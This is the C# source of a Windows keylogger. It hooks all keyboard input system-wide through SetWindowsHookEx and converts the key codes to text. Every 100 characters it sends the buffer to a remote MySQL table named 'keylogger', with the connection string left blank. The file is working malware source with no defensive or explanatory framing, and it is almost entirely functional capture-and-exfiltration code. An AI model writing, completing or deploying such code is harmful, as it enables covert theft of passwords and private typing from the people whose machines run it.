using System;
using System.Runtime.InteropServices; // For DLL and reading keystrokes from memory
using System.Diagnostics; // For building a hook for gaining access to running processes and modules.
using System.Windows.Forms; // For running of application and converting keystrokes
using System.IO;
using System.Net.Mail;
using System.Text;
using MySql.Data.MySqlClient;

namespace KeyLogger
{
    class Logger
    {
        private static int WH_KEYBOARD_LL = 13; // Monitor for low-level keyboard inputs events
        private static int WM_KEYDOWN = 0x0100; //Identifier of the keyboard message. Non-system key (ALT is not pressed)
        private static IntPtr hook = IntPtr.Zero;     // Representation of pointer of handler. ZERO = readOnly
        private static LowLevelKeyboardProc llkProcedure = HookCallback;    //Delegate of the HookCallback. The HookCallback function defines what we want to do every time a new keyboard input event takes place.

        private static StringBuilder stringBuilder;

        private static string connectionString = "";

        public Logger()
        {
            stringBuilder = new StringBuilder();
        }

        public void Start()
        {
            hook = SetHook(llkProcedure);   //Defining our hook
            Application.Run();              // Main loop
            UnhookWindowsHookEx(hook);
        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            Process currentProcess = Process.GetCurrentProcess();
            ProcessModule currentModule = currentProcess.MainModule;
            String moduleName = currentModule.ModuleName;
            IntPtr moduleHandle = GetModuleHandle(moduleName);
            return SetWindowsHookEx(WH_KEYBOARD_LL, llkProcedure, moduleHandle, 0);    // Build and return SetWindowsHookEx function
        }

        private delegate IntPtr LowLevelKeyboardProc(int ncode, IntPtr wParam, IntPtr lparam);

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)  //wParam is pressed
            {

                if (stringBuilder.Length >= 100)
                {
                    SendToDatabase();
                }
                int vkCode = Marshal.ReadInt32(lParam);     //Gets int value stored in the memory address held in lParam
                string readableCharacter = GetReadableCharacter(vkCode);
                stringBuilder.Append(readableCharacter);
            }
            return CallNextHookEx(IntPtr.Zero, nCode, wParam, lParam);
        }

        private static string GetReadableCharacter(int vkCode)
        {
            switch ((Keys)vkCode)
            {
                case Keys.LButton:
                case Keys.MButton:
                case Keys.Shift:
                case Keys.ShiftKey:
                case Keys.LShiftKey:
                case Keys.RShiftKey:
                case Keys.Capital:
                case Keys.LWin:
                case Keys.Back:
                case Keys.LControlKey:
                case Keys.RControlKey:
                case Keys.RWin: return "[" + (Keys)vkCode + "]";
                case Keys.OemPeriod: return ".";
                case Keys.Decimal:
                case Keys.Oemcomma: return ",";
                case Keys.Space: return " ";
                case Keys.Enter: return "\n";
                case Keys.Tab: return "\t";
                case Keys.Oemtilde: return ";";
                default:
                    /*
                     * UNICODE
                     IntPtr hWindowHandle = GetForegroundWindow();
                     uint dwProcessId;
                     uint dwThreadId = GetWindowThreadProcessId(hWindowHandle, out dwProcessId);
                     byte[] kState = new byte[256];
                     GetKeyboardState(kState); //retrieves the status of all virtual keys
                     uint HKL = GetKeyboardLayout(dwThreadId); //retrieves the input locale identifier
                     StringBuilder keyName = new StringBuilder();
                     ToUnicodeEx((uint)(Keys)vkCode, (uint)(Keys)vkCode, kState, keyName, 16, 0, HKL);



                     return keyName.ToString();
                     
                    
                    var keyboardState = new byte[256];
                    StringBuilder sb = new StringBuilder(256);
                    ToUnicode((uint)(Keys)vkCode, 0, keyboardState, sb, 256, 0);
                    return sb.ToString();
                    */
                    return (Keys)vkCode + "";
            }
        }


        private static void SendToDatabase()
        {
            MySqlConnection conn = new MySqlConnection(connectionString);
            conn.Open();
            MySqlCommand comm = conn.CreateCommand();
            comm.CommandText = "INSERT INTO keylogger (text) VALUES(@text)";
            comm.Parameters.AddWithValue("@text", stringBuilder.ToString());
            comm.ExecuteNonQuery();
            conn.Close();

            stringBuilder.Clear();
        }


        [DllImport("user32.dll")]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetModuleHandle(String lpModulename);

        [DllImport("user32.dll")]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll")]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Unicode)]
        public static extern int ToUnicode(
            uint virtualKeyCode,
            uint scanCode,
            byte[] keyboardState,
            StringBuilder receivingBuffer,
            int bufferSize,
            uint flags
        );

        [DllImport("user32.dll")]
        static extern int ToUnicodeEx(uint wVirtKey, uint wScanCode, byte[] lpKeyState, [Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pwszBuff, int cchBuff, uint wFlags, uint dwhkl);

        [DllImport("user32.dll")]
        public static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll", SetLastError = true)]
        static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);

        [DllImport("user32.dll", SetLastError = true)]
        static extern uint GetKeyboardLayout(uint idThread);

        [DllImport("user32.dll")]
        public static extern IntPtr GetKeyboardState(byte[] lpKeyState);
    }
}
